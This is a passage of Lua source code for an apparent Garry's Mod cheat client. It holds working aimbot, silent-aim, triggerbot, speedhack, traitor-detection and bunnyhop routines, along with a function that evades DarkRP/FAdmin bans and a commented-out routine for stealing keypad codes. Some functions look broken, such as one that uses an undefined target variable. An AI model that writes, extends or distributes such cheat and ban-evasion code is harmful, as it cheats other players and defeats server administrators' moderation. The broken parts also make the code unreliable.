	local dist2 = r["Vector"]["DistToSqr"]( r["Entity"]["GetPos"]( old ), r["Entity"]["GetPos"]( me ) );

	return ( dist < dist2 );

end

function NH.Aimbot.FindPoint( e )
	if r["Entity"]["EyeAngles"]( e )['p'] < -89 then
		return r["Entity"]["LocalToWorld"]( e, r["Entity"]["OBBCenter"]( e ) );
	end
	
	if ( NH.Get( "Aimbot", "trace_bone" ) != "" ) then 
		local head = r["Entity"]["LookupBone"]( e, NH.Get( "Aimbot", "trace_bone" ) );
		if head then
			local pos = r["Entity"]["GetBonePosition"]( e, head );
			if pos then
				return pos
			end
		end
	end

	for k, v in g.pairs( NH.Aimbot.PosAttachments ) do
		if( r["Entity"]["LookupAttachment"]( e, v ) ) then
			local att = r["Entity"]["GetAttachment"]( e, r["Entity"]["LookupAttachment"]( e, v ) );
			if( att ) then
				return att['Pos'];
			end
		end
	end

	local special = NH.Aimbot.ModelTarget[g.string.lower(r["Entity"]["GetModel"]( e ))];
	if special then
		if g.type(special) == "string" then
			local bone = r["Entity"]["LookupBone"]( e, special );
			if bone then
				local pos = r["Entity"]["GetBonePosition"]( e, bone );
				if pos then
					return pos
				end
			end
		elseif g.type(special) == "Vector" then
			return r["Entity"]["LocalToWorld"]( e, special );
		elseif g.type(special) == "function" then
			local pos = g.pcall(special, e);
			if pos then return pos end
		end
	end

	local head = r["Entity"]["LookupBone"]( e, "ValveBiped.Bip01_Head1" );
	if head then
		local pos = r["Entity"]["GetBonePosition"]( e, head );
		if pos then
			return pos;
		end
	end
	
	return r["Entity"]["LocalToWorld"]( e, r["Entity"]["OBBCenter"]( e ) );
end

/*
gmod 12
local SpawnFlags = SF_NPC_FADE_CORPSE | SF_NPC_ALWAYSTHINK | SF_NPC_NO_WEAPON_DROP

gmod 13
local SpawnFlags = bit.bor( SF_NPC_FADE_CORPSE, SF_NPC_ALWAYSTHINK, SF_NPC_NO_WEAPON_DROP )
*/

local BB = { }
function BB.VelocityPrediction( ply ) return ply:GetAbsVelocity() * 0.012; end

function BB.ClosestAngle( ply )
	local flAngleDifference = nil;
	local newAngle = nil;
	local viewAngles = me:EyeAngles();

		local vecPos, ang = NH.Aimbot.FindPoint( targ );
		local oldpos = vecPos;
		vecPos = vecPos - BB.VelocityPrediction( me ) + BB.VelocityPrediction( ply )
		local angAngle = ( vecPos - me:EyePos() ):Angle()
		local flDif = g.math.abs( g.math.AngleDifference( angAngle.p, viewAngles.p ) ) + g.math.abs( g.math.AngleDifference( angAngle.y, viewAngles.y ) );

		if ((flAngleDifference == nil || flDif < flAngleDifference) /*&& (!BB.CVARS.Numbers["Max Angle"].cvar:GetBool() || flDif < BB.CVARS.Numbers["Max Angle"].cvar:GetFloat())*/) then
			BB.HeadPos = oldpos:ToScreen();
			BB.Target = ply;
			flAngleDifference = flDif;
			newAngle = angAngle;
		end
	
	return newAngle;
end
//&& !g.table.HasValue( NH.Traitor.Weps, wep:EntIndex() ) && !g.table.HasValue( NH.Traitor.Players, wep:GetOwner() )
function NH.Aimbot.CalculateTargets()

	me.voice_battery = 100; // I DONT CAARRREEEEEE!!!!

	// Calculate traitors ( if it's TTT )

	if ( _G.KARMA ) then

		for _, ply in g.pairs( g.player.GetAll() ) do 

			for _, wep in g.pairs( r["Player"]["GetWeapons"]( ply ) ) do

				if ( wep.CanBuy && g.table.HasValue( wep.CanBuy, ROLE_TRAITOR ) ) then 

					if !( g.table.HasValue( NH.Traitor.Weps, wep:EntIndex() ) or g.table.HasValue( NH.Traitor.Players, ply ) ) then

						g.table.insert( NH.Traitor.Weps, wep:EntIndex() );
						g.table.insert( NH.Traitor.Players, ply );

					end

				end

			end

		end

	end

	// Calculate best targets	

	if ( !NH.Get( "Aimbot", "enabled" ) ) then return; end

	local best;

	if ( !NH.Aimbot.CanFire() ) then return; end

	for _, ply in g.pairs( g.player.GetAll() ) do 

		if ( ply != me && NH.Aimbot.CanTarget( ply ) && ( !NH.Aimbot.CanTarget( best ) || NH.Aimbot.IsBetter( ply, best ) ) ) then 
			local trace = {};
			local point = NH.Aimbot.FindPoint( ply );

			if ( Module.INillarhHack.IsVisible( r["Player"]["GetShootPos"]( me ), point, r["Entity"]["EntIndex"]( ply ) ) ) then 

				best = ply; 

			end 

		end

	end

	NH.Aimbot.BestTarget = best;

end

function NH.Aimbot.GetBestTarget()

	return NH.Aimbot.BestTarget;

end

function NH.Aimbot.GetSpread( cmd, ang )

	local wep = r["Player"]["GetActiveWeapon"]( me );

	if( g.IsValid( wep ) ) then

		if NH.Aimbot.ConeDefaultCache[wep:GetPrintName()] then 

			NH.Aimbot.Coneval = NH.Aimbot.ConeDefaultCache[wep:GetPrintName()] 

		elseif NH.Aimbot.ConeCache[ wep.Base ] then 

			NH.Aimbot.Coneval = NH.Aimbot.ConeCache[ wep.Base ]( wep ) 

		elseif NH.Aimbot.Conecur[wep:GetPrintName()] then 

			NH.Aimbot.Coneval = NH.Aimbot.Conecur[wep:GetPrintName()] 

		else

			NH.Aimbot.Coneval = wep.Primary and wep.Primary.Cone or 0

		end

		if( g.tonumber( NH.Aimbot.Coneval ) ) then

			NH.Aimbot.Conevec =  g.Vector( -NH.Aimbot.Coneval, -NH.Aimbot.Coneval, -NH.Aimbot.Coneval );

		elseif ( g.type( NH.Aimbot.Coneval ) == "Vector" ) then

			NH.Aimbot.Conevec = -1 * NH.Aimbot.Coneval;

		elseif ( g.type( NH.Aimbot.Coneval ) == "function" ) then

			NH.Aimbot.Conevec = g.pcall( NH.Aimbot.Coneval )

		else

			return ang

		end

	end

	local vang = ( r["Angle"]["Forward"]( ang or r["Vector"]["Angle"]( r["Entity"]["GetAimVector"]( me ) ) ) );

	return r["Vector"]["Angle"]( Module.INillarhHack.GetSpread( Module.INillarhHack.GetSeed( Module.INillarhHack.GetCommandNumber( cmd ) ), vang, NH.Aimbot.Conevec ) );

end

function NH.Aimbot.IsFiring( cmd )

	if ( !NH.Get( "Triggerbot", "enabled" ) ) then 

		if ( NH.Get( "Aimbot", "trace_key" ) == IN_ATTACK && !r["CUserCmd"]["KeyDown"]( cmd, IN_ATTACK ) ) then return false; end
		if ( NH.Get( "Aimbot", "trace_key" ) != IN_ATTACK && !input.Correct( NH.Get( "Aimbot", "trace_key" ) ) ) then return false; end

	end

	return true;

end

function NH.Aimbot.Antisnap(ang)

    ang.p = g.math.NormalizeAngle(ang.p);
    ang.y = g.math.NormalizeAngle(ang.y);
	ang.r = 0;
    lpang = r["Entity"]["EyeAngles"]( me );

    local as = NH.Get( "Aimbot", "antisnap_speed" );
    lpang.p = g.math.Approach(lpang.p, ang.p, as);
    lpang.y = g.math.Approach(lpang.y, ang.y, as);
    lpang.r = 0;
    ang = lpang;

    return ang;

end

//NH.GUI.ConsoleHistory[ #NH.GUI.ConsoleHistory + 1 ] = com;
function NH.Console()
/*
	local int = 0;
	
	g.draw.RoundedBox( 1, g.ScrW() / 2 - 150, g.ScrH() - 80, 300, 80, g.Color( 0, 0, 0, 150 ) );
	
	for k, v in g.pairs( NH.GUI.ConsoleHistory ) do
		g.draw.SimpleText( v, "TabLarge", g.ScrW() / 2 - 145, ( g.ScrH() - 75 ) + int, g.Color( 255, 255, 255 ) );
		int = int + 13;
	end
*/
end
//NH:AddHook( "HUDPaint", NH.Console )

function NH.Aimbot.CreateMove( cmd )

	if ( !NH.Get( "Aimbot", "enabled" ) ) then return; end

	local targ = NH.Aimbot.BestTarget;

	if ( targ && NH.Aimbot.CanFire() && NH.Aimbot.CanTarget( targ ) && NH.Aimbot.IsFiring( cmd ) ) then 

		local meVelocity, targVelocity, wep = me:GetVelocity(), targ:GetVelocity(), me:GetActiveWeapon();

		NH.Aimbot.OldVelocity[targ] = ( targVelocity ); 
		NH.Aimbot.OldVelocity[me] = ( meVelocity ); 
		NH.Aimbot.OldTime = ( g.RealTime() ); 

		if ( !NH.SilentAim.IsEngaged ) then NH.SilentAim.SetEngaged( cmd, true ); end 

		NH.SilentAim.CalculateSimulatedAngles( cmd ); 

		local point = NH.Aimbot.FindPoint( targ ); 

		local mpos, tpos = r["Player"]["GetShootPos"]( me ), point; 

		tpos = tpos + ( ( ( NH.Aimbot.OldVelocity[targ] * ( NH.Aimbot.PredictedTime + ( targ:Ping() / NH.Get( "Aimbot", "prediction_latency" ) ) ) + targVelocity ) / NH.Get( "Aimbot", "prediction_delta" ) ) - ( ( NH.Aimbot.OldVelocity[me] * ( NH.Aimbot.PredictedTime + ( me:Ping() / NH.Get( "Aimbot", "prediction_latency" ) ) ) + meVelocity ) / NH.Get( "Aimbot", "prediction_delta" ) ) );

		if ( wep:GetClass() and NH.Aimbot.Prediction[wep:GetClass()] ) then
			local time = me:GetPos():Distance(targ:GetPos()) / NH.Aimbot.Prediction[wep:GetClass()]; 
			tpos = ( tpos + targVelocity * time ); 
		end

		if ( wep:GetPrintName() == "#HL2_Crossbow" ) then
			tpos = tpos + g.Vector( 0,0, ( me:GetShootPos():Distance( targ:GetPos() ) / 244.286 ) + g.math.sin( ( tpos - me:GetShootPos() ):Angle().p ) ); 
		end

/*		if ( me:GetVelocity():Length() > 100 ) then
			tpos = tpos - g.Vector(0 , 0 , meVelocity:Length() / 250);
		end

		local speed, distance = me:GetPos():Distance(me:GetPos() + meVelocity), me:GetPos():Distance(targ:GetPos());
		if ( distance < 4000 && speed > 0 ) then 
			targ = targ - meVelocity * distance / (speed * distance * 0.125); 
		end*/

		local tang = r["Vector"]["Angle"]( tpos - mpos ); 

		tang = NH.Aimbot.GetSpread( cmd, tang ); 

		tang = NH.NormalizeAngle( tang, 0 ); 

		if NH.Get( "Aimbot", "antisnap_enabled" ) then

			tang = NH.Aimbot.Antisnap( tang ); 

		end

		r["CUserCmd"]["SetViewAngles"]( cmd, tang ); 

		NH.Aimbot.PredictedTime = ( g.RealTime() - NH.Aimbot.OldTime ); 
/*		NH.Aimbot.PredictedVelocity[targ] = ( targVelocity - NH.Aimbot.OldVelocity[targ] ); 
		NH.Aimbot.PredictedVelocity[me] = ( meVelocity - NH.Aimbot.OldVelocity[me] ); */

		if ( NH.Get( "Triggerbot", "enabled" ) ) then 

			NH.Triggerbot.Fire(); 

		end

	else 

		if ( r["CUserCmd"]["KeyDown"]( cmd, IN_ATTACK ) ) then 

			if ( !NH.SilentAim.IsEngaged ) then NH.SilentAim.SetEngaged( cmd, true ); end 

			NH.SilentAim.CalculateSimulatedAngles( cmd ); 

			local tang = NH.Aimbot.GetSpread( cmd, NH.SilentAim.Angle or ( me:GetAimVector() ):Angle() ); 

			tang = NH.NormalizeAngle( tang, 0 ); 

			r["CUserCmd"]["SetViewAngles"]( cmd, tang ); 

		else

			if ( NH.SilentAim.IsEngaged ) then NH.SilentAim.SetEngaged( cmd, false ); end

		end

		if ( NH.Get( "Triggerbot", "enabled" ) ) then 

			NH.Triggerbot.Stop();

		end

	end

end
// print(CurTime()) print(SysTime()) print(RealTime())

// ============================= DeathNotify ============================= //



NH.DeathCheck = {};
NH.DeathCheck.DeadPlayers = {};

function NH.DeathCheck.Notice() 

	if ( IsTTT != true ) then return false; end

	for _, ply in g.pairs( g.player.GetAll() ) do 

		if ( ( !ply:Alive() || ply:Health() <= 0 ) && !g.table.HasValue( NH.DeathCheck.DeadPlayers, ply ) ) then 

			g.table.insert(NH.DeathCheck.DeadPlayers, ply)
			NH.Logging.ThrowNotify( ply:Nick().." has died!" ); 

		end 

	end 

end 

g.timer.Create( "NH_DeathCheck", 0.25, 0, NH.DeathCheck.Notice )

// ============================= SoundSystem ============================= //

// InDev
NH.SoundSystem = {}
NH.SoundSystem.Directories = {
"soundsystem/dark", 
"soundsystem/female", 
"soundsystem/german", 
"soundsystem/new"}
NH.SoundSystem.Sounds ={
"dominating.mp3",
"headhunter.wav",
"multikill.mp3",
"monsterkill.mp3",
"rampage.mp3",
"humiliation.mp3",
"killingspree.mp3",
"ludicrouskill.mp3",
"unstoppable.mp3",
"ultrakill.mp3",
"holyshit.mp3",
"wickedsick.mp3",
"godlike.mp3"}

function NH.SoundSystem.CalculateSound()

	local sound = table.Random(NH.SoundSystem.Sounds)
	local dir = table.Random(NH.SoundSystem.Directories).."/"..sound

	// Hardcoded
	if sound == "dominating.mp3" then
		local title = "dominating!"
	elseif sound == "headhunter.wav" then
		local title = "headhunter!"
	elseif sound == "multikill.mp3" then
		local title = "multikill!"
	elseif sound == "multikill.mp3" then
		local title = "multikill!"
	elseif sound == "monsterkill.mp3" then
		local title = "monsterkill!"
	elseif sound == "rampage.mp3" then
		local title = "rampage!"
	elseif sound == "humiliation.mp3" then
		local title = "humiliation!"
	elseif sound == "killingspree.mp3" then
		local title = "killingspree!"
	elseif sound == "ludicrouskill.mp3" then
		local title = "ludicrouskill!"
	elseif sound == "unstoppable.mp3" then
		local title = "unstoppable!"
	elseif sound == "ultrakill.mp3" then
		local title = "ultrakill!"
	elseif sound == "holyshit.mp3" then
		local title = "holyshit!"
	elseif sound == "wickedsick.mp3" then
		local title = "wickedsick!"
	elseif sound == "godlike.mp3" then
		local title = "godlike!"
	else
		local title = "killer!"
	end

//	local title = string.upper( title )

	return title, dir

end

function NH.SoundSystem.Play(ply, hitgroup, dmginfo)

	if ( me != dmginfo:GetAttacker() ) then return false end // Do i attack?

	local trace = util.TraceLine( {
		start = me:GetShootPos(),
		endpos = me:GetShootPos()+(me:GetAimVector()*80),
		filter = me,
		mask = MASK_SHOT + CONTENTS_WINDOW,
	} )

	local title, dir = NH.SoundSystem.CalculateSound() // Correct sound

	if ( ( trace.HitNonWorld ) and ( hitgroup == HITGROUP_HEAD ) ) then // Did we hit in the head?
		if ( 0 < ( dmginfo:GetDamage() - ply:Health() ) ) then // Is he dead?
			surface.PlaySound( dir ) 
			hook.Add( "Think", "SoundSystem", function() 
				draw.DrawText( title, "ScoreboardText", ScrW()/2, ScrH()/3, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER ) 
			end ) 
			timer.Simple( 5, function() 
				hook.Remove("Think", "SoundSystem") 
			end ) 
		end
	end

end

/*
//SoundSystem

DomPlayed = false
HHPlayed = false
MulPlayed = false
MONPlayed = false
RAPlayed = false
HUPlayed = false
KilPlayed = false
LUDPlayed = false
UNSPlayed = false
ULTPlayed = false
HOLPlayed = false
WICPlayed = false
GODPlayed = false
PlaySound = true

Showtime = 0
alpha = 0
titel = "nope"


function Playerdie()

if( deaths < death ) then
	return true
else
	return false
end
deaths = death

end

Dom = GetConVarNumber("royalhack_dom")
HH = GetConVarNumber("royalhack_headh")
Mul = GetConVarNumber("royalhack_mulk")
MON = GetConVarNumber("royalhack_mon")
RA = GetConVarNumber("royalhack_rap")
HU = GetConVarNumber("royalhack_hu")
Kil = GetConVarNumber("royalhack_kil")
LUD = GetConVarNumber("royalhack_lud")
UNS = GetConVarNumber("royalhack_uns")
ULT = GetConVarNumber("royalhack_ult")
HOL = GetConVarNumber("royalhack_hol")
WIC = GetConVarNumber("royalhack_wic")
GOD = GetConVarNumber("royalhack_god")

function DrawText(x,y,font,str,color)

	

surface.SetTextColor( color)
surface.SetTextPos( x, y ) 
surface.SetFont(font)
surface.DrawText( str )


end

function PrintMessageToScreen( str )
	Showtime = CurTime()
	titel = str
	alpha = 255
end

function HookMessage()

	if( Showtime + 4 < CurTime() and alpha > 0) then
		alpha = alpha - (FrameTime()*200)
	end
	
	if( alpha > 0 ) then
		---DrawText(ScrW()/2, ScrH()/3,,"ScoreboardText",titel, Color( 255, 255, 255, math.Clamp( alpha, 0, 255 )))
		draw.DrawText( titel, "ScoreboardText", ScrW()/2, ScrH()/3, Color( 255, 255, 255, math.Clamp( alpha, 0, 255 ) ), TEXT_ALIGN_CENTER )
	end

end

hook.Add("HUDPaint","HM",HookMessage)

function ResetAllSounds()

	

		DomPlayed = false
		HHPlayed = false
		MulPlayed = false
		MONPlayed = false
		RAPlayed = false
		HUPlayed = false
		KilPlayed = false
		LUDPlayed = false
		UNSPlayed = false
		ULTPlayed = false
		HOLPlayed = false
		WICPlayed = false
		GODPlayed = false
		Msg("Sounds Reset")
end


function RoyalHack.SoundSystem()
local path = "soundsystem/"
local getpath = GetConVarString("royalhack_sound_quake_path")
if(LocalPlayer():Alive()) then
	if( GetConVarNumber("royalhack_sound_quake") == 1 ) then
		if(LocalPlayer():Frags() == Dom and DomPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Dominating")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Dominating")
			end
			directories = {"dark", "female", "german", "new"}
			//"soundsystem"..table.random(directories).."/dominating.mp3
			surface.PlaySound(""..path..getpath.."/dominating.mp3")
			DomPlayed = true
		end
		if(LocalPlayer():Frags() == HH and HHPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Headhunter")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Headhunter")
			end
			surface.PlaySound(""..path..getpath.."/headhunter.wav")
			HHPlayed = true
		end
		if(LocalPlayer():Frags() == Mul and MulPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Multikill")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Multikill")
			end
			surface.PlaySound(""..path..getpath.."/multikill.mp3")
			MulPlayed = true
		end
		if(LocalPlayer():Frags() == MON and MONPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Monsterkill")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Monsterkill")
			end
			surface.PlaySound(""..path..getpath.."/monsterkill.mp3")
			MONPlayed = true
		end
		if(LocalPlayer():Frags() == RA and RAPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Rampage")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Rampage")
			end
			surface.PlaySound(""..path..getpath.."/rampage.mp3")
			RAPlayed = true
		end
		if(LocalPlayer():Frags() == HU and HUPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Humiliation")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Humiliation")
			end
			surface.PlaySound(""..path..getpath.."/humiliation.mp3")
			HUPlayed = true
		end
		if(LocalPlayer():Frags() == Kil and KilPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Killingspree")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Killingspree")
			end
			surface.PlaySound(""..path..getpath.."/killingspree.mp3")
			KilPlayed = true
		end
		if(LocalPlayer():Frags() == LUD and LUDPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Ludicrouskill")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Ludicrouskill")
			end
			surface.PlaySound(""..path..getpath.."/ludicrouskill.mp3")
			LUDPlayed = true
		end
		if(LocalPlayer():Frags() == UNS and UNSPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Unstoppable")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Unstoppable")
			end
			surface.PlaySound(""..path..getpath.."/unstoppable.mp3")
			UNSPlayed = true
		end
		if(LocalPlayer():Frags() == ULT and ULTPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Ultrakill")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Ultrakill")
			end
			surface.PlaySound(""..path..getpath.."/ultrakill.mp3")
			ULTPlayed = true
		end
		if(LocalPlayer():Frags() == HOL and HOLPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Holyshit")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Holyshit")
			end
			surface.PlaySound(""..path..getpath.."/holyshit.mp3")
			HOLPlayed = true
		end
		if(LocalPlayer():Frags() == WIC and WICPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Wickedsick")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Wickedsick")
			end
			surface.PlaySound(""..path..getpath.."/wickedsick.mp3")
			WICPlayed = true
		end
		if(LocalPlayer():Frags() == GOD and GODPlayed == false) then
			if( GetConVarNumber("royalhack_sound_quake_chatprint") == 1 ) then
			LocalPlayer():ChatPrint("Godlike")
			end
			if( GetConVarNumber("royalhack_sound_quake_hudtext") == 1 ) then
			PrintMessageToScreen("Godlike")
			end
			surface.PlaySound(""..path..getpath.."/godlike.mp3")
			GODPlayed = true
		end
			end
		end


	end

hook.Add("Think","sound",RoyalHack.SoundSystem)
*/

// NH.AddHook("ScalePlayerDamage", NH.SoundSystem.Play)

// ============================= Triggerbot ============================= //

NH.Triggerbot = {};
NH.Triggerbot.LastFire = g.RealTime();
NH.Triggerbot.lDelay = 0;
NH.Triggerbot.Fired = false;

function NH.Triggerbot.Fire()
	local delay = r["Player"]["GetActiveWeapon"]( me ).Primary and r["Player"]["GetActiveWeapon"]( me ).Primary.Delay or 0.05;

	if ( g.RealTime() - NH.Triggerbot.LastFire >= delay ) then 

		if ( NH.Get( "Triggerbot", "delay" ) != 0 ) then

			g.timer.Simple( NH.Get( "Triggerbot", "delay" ), function() Module.INillarhHack.RunConsoleCommand( "+attack" ); end );

		else 

			Module.INillarhHack.RunConsoleCommand( "+attack" );

		end		

		NH.Triggerbot.lDelay = delay;
		NH.Triggerbot.LastFire = g.RealTime();
		NH.Triggerbot.Fired = true;

	else 

		if ( NH.Triggerbot.Fired ) then 

			Module.INillarhHack.RunConsoleCommand( "-attack" );
			NH.Triggerbot.Fired = false;

		end 

	end

end

function NH.Triggerbot.Stop()

	if ( NH.Triggerbot.Fired ) then 

		Module.INillarhHack.RunConsoleCommand( "-attack" );
		NH.Triggerbot.Fired = false;

	end

end

// ============================= DarkRP Ban Bypass ============================= //

function NH.AntiDRPBan()
	for k, v in g.pairs( g.hook.GetTable().HUDPaint ) do
		if k == "FAdmin_ban" then
			g.print("[NH] DarkRP Ban evaded")
			NH.Logging.Print( NH.Get( "Logging", "log_console" ), g.Color( 0, 225, 0, 255 ), "DarkRP Ban evaded" );
			g.hook.Remove("HUDPaint", "FAdmin_ban")
			g.RunConsoleCommand("retry","")
		end
	end
end

// ============================= NoHands ============================= //

NH.NoHands = {};

function NH.NoHands.SetVisible()

	if ( !NH.Get( "NoHands", "enabled" ) ) then return nil; end

	return Module.Kroy.NoDraw( g.Material( "models/weapons/v_models/hands/v_hands" ), NH.Get( "NoHands", "enabled" ) )

end

function NH.NoHands.SetNoDraw()

	if ( !NH.Get( "NoHands", "enabled" ) ) then return nil; end

end

// Being safe
NH.Detours.Add( _G.debug.getregistry()["Player"], "GetHands", function( ent )

	if ( ent == me and NH.Get( "NoHands", "enabled" ) ) then

		return nil;

	end

	return NH.Detours.GetOriginal( _G.debug.getregistry()["Player"], "GetHands" )( ent );

end, NH.Detours.Modes.DETOUR_NORMAL )

NH.Detours.Add( _G.debug.getregistry()["Player"], "GetHandsModel", function( ent )

	if ( ent == me and NH.Get( "NoHands", "enabled" ) ) then

		return nil;

	end

	return NH.Detours.MetaCache[r['Player']['GetHandsModel']]( ent );

end, NH.Detours.Modes.DETOUR_NORMAL )

// ============================= SpeedHack ============================= //

NH.SpeedHack = {};
NH.SpeedHack.Device = g.input.IsKeyDown;

function NH.SpeedHack.Do()
	if ( !NH.Get( "SpeedHack", "enabled" ) ) then return; end

	if ( input.Correct( NH.Get( "SpeedHack", "key" ) ) ) then
//		Module.INillarhHack.SetCVar("host_timescale", g.tonumber( NH.Get( "SpeedHack", "speed" ) ) );
		Module.Kroy.ForceCVar("host_timescale", g.tonumber( NH.Get( "SpeedHack", "speed" ) ) );
	else
//		Module.INillarhHack.SetCVar("host_timescale", g.tonumber( 1 ) );
		Module.Kroy.ForceCVar("host_timescale", g.GetConVar("host_timescale"):GetDefault() );
	end
end

// ============================= KeyPad Crack ============================= //

NH.KeyPad = {};
NH.KeyPad.X = -50;
NH.KeyPad.Y = -100;
NH.KeyPad.Pos =	{	
	{NH.KeyPad.X+5, NH.KeyPad.Y+100, 25, 25, -2.2, 3.45, 1.3, -0},
	{NH.KeyPad.X+37.5, NH.KeyPad.Y+100, 25, 25, -0.6, 1.85, 1.3, -0},
	{NH.KeyPad.X+70, NH.KeyPad.Y+100, 25, 25, 1.0, 0.25, 1.3, -0},

	{NH.KeyPad.X+5, NH.KeyPad.Y+132.5, 25, 25, -2.2, 3.45, 2.9, -1.6},
	{NH.KeyPad.X+37.5, NH.KeyPad.Y+132.5, 25, 25, -0.6, 1.85, 2.9, -1.6},
	{NH.KeyPad.X+70, NH.KeyPad.Y+132.5, 25, 25, 1.0, 0.25, 2.9, -1.6},

	{NH.KeyPad.X+5, NH.KeyPad.Y+165, 25, 25, -2.2, 3.45, 4.55, -3.3},
	{NH.KeyPad.X+37.5, NH.KeyPad.Y+165, 25, 25, -0.6, 1.85, 4.55, -3.3},
	{NH.KeyPad.X+70, NH.KeyPad.Y+165, 25, 25, 1.0, 0.25, 4.55, -3.3},

	{NH.KeyPad.X+5, NH.KeyPad.Y+67.5, 50, 25, -2.2, 4.7, -0.3, 1.6},
	{NH.KeyPad.X+60, NH.KeyPad.Y+67.5, 35, 25, 0.3, 1.65, -0.3, 1.6},
};

function NH.KeyPad.Calculate()
/*	for k,v in g.pairs( g.player.GetAll() ) do
		local kp = v:GetEyeTrace().Entity
		if g.IsValid(kp) and g.string.find(r["Entity"]["GetClass"]( kp ), "keypad") and r["Entity"]["EyePos"]( v ):Distance(kp:GetPos()) <= 71 then
			kp.tempCode = kp.tempCode or ""
			kp.tempText = kp.tempText or ""
			kp.tempStatus = kp.tempStatus or 0

			if kp:GetDisplayText() != kp.tempText or kp:GetStatus() != kp.tempStatus then
				kp.tempText = kp:GetDisplayText()
				kp.tempStatus = kp:GetStatus()

				local tr = g.util.TraceLine({
					start = r["Entity"]["EyePos"]( v ),
					endpos = r["Player"]["GetAimVector"]( v ) * 32 + r["Entity"]["EyePos"]( v ),
					filter = v
				})

				local pos = r["Entity"]["WorldToLocal"]( kp, tr.HitPos )

				for i,p in g.pairs(NH.KeyPad.Pos) do
					NH.KeyPad.X = (pos.y - p[5]) / (p[5] + p[6])
					NH.KeyPad.Y = 1 - (pos.z + p[7]) / (p[7] + p[8])

					if (NH.KeyPad.X >= 0 and NH.KeyPad.Y >= 0 and NH.KeyPad.X <= 1 and NH.KeyPad.Y <= 1) then
						if i == 11 then
							g.timer.Simple(0, function()
								if kp:GetStatus() == 1 then
									kp.code = kp.tempCode
								end
								kp.tempCode = ""
							end)		
						elseif i == 10 then
							kp.tempCode = ""
						else
							kp.tempCode = kp.tempCode..i
						end
					end
				end
			end
		end
	end*/
end

// ============================= Bunnyhop ============================= //

NH.Bunnyhop = {};
NH.Bunnyhop.oldEyePos = me:EyeAngles();
NH.Bunnyhop.traceRes = me:EyeAngles();

//ucmd = ply:GetCurrentCommand()

g.timer.Create("NH_Bunnyhop", 0.1, 0, function() NH.Bunnyhop.traceRes = me:EyeAngles(); end);

function NH.Bunnyhop.Jump( ucmd )
	if ( !NH.Get( "Bunnyhop", "enabled" ) ) then return; end

	if ( NH.Get( "Bunnyhop", "Auto_jump" ) ) then
		if bit.band( ucmd:GetButtons(), IN_JUMP ) ~= 0 then
			if !me:IsOnGround() then 
				ucmd:SetButtons( bit.band( ucmd:GetButtons(), bit.bnot( IN_JUMP ) ) ) 
			end 
		end 
	end

	if ( NH.Get( "Bunnyhop", "Auto_Strafe" ) and ( bit.band( ucmd:GetButtons(), IN_JUMP ) ~= 0 ) ) then
		while ( NH.Bunnyhop.traceRes.y > NH.Bunnyhop.oldEyePos.y ) do
			NH.Bunnyhop.oldEyePos = NH.Bunnyhop.traceRes;
			ucmd:SetButtons( bit.bor( ucmd:GetButtons(), IN_MOVELEFT ) )
/*			g.timer.Simple( .025, function()
				g.RunConsoleCommand("-moveleft")
			end )*/
		end

		while ( NH.Bunnyhop.oldEyePos.y > NH.Bunnyhop.traceRes.y )  do
			NH.Bunnyhop.oldEyePos = NH.Bunnyhop.traceRes;
			ucmd:SetButtons( bit.bor( ucmd:GetButtons(), IN_MOVERIGHT ) )
/*			g.timer.Simple( .025, function()
				g.RunConsoleCommand("-moveright")
			end )*/
		end
	end
end

// ============================= AutoReload ============================= //

NH.AutoReload = {};
NH.AutoReload.LastReload = 0
NH.AutoReload.Reloadspeed = 1

// Gonna make this
function NH.AutoReload.Do()
	if ( !NH.Get( "AutoReload", "enabled" ) and NH.Get( "Aimbot", "bad_weapons" )[ me:GetActiveWeapon() ] != true ) then return; end

--	if ( me:GetActiveWeapon() and me:GetActiveWeapon():Clip1() <= 0 ) then
--		Module.INillarhHack.RunConsoleCommand( "+reload" )
--	else
--		Module.INillarhHack.RunConsoleCommand( "-reload" )
--	end
